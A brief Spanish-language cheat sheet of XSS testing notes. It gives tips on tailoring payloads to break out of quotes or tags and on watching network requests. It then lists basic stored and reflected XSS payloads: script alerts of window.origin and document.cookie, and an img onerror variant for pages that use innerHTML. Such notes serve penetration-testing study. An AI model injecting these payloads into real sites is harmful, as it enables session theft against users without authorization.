Tomar en cuenta que algunas veces vamos a tener que ver el codigo para personalizar nuestro payload porque algunas veces se tendra que romper comillas o cerrar tags del mismo codigo para que funcione nuestro payload

Tambi`en tomar ojo en el network de la misma pagina porque el payload tal vez se envia en un post o un get que no es del boton que estamos ejecutando

# Stored & Reflected XSS
```
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
```

# Reflected XSS
Tomar en cuenta que cuando el js usa innerhtml los tags <script> no funcionan porque existe una purificacion
```
<img src=x onerror=alert(document.cookie)>
```
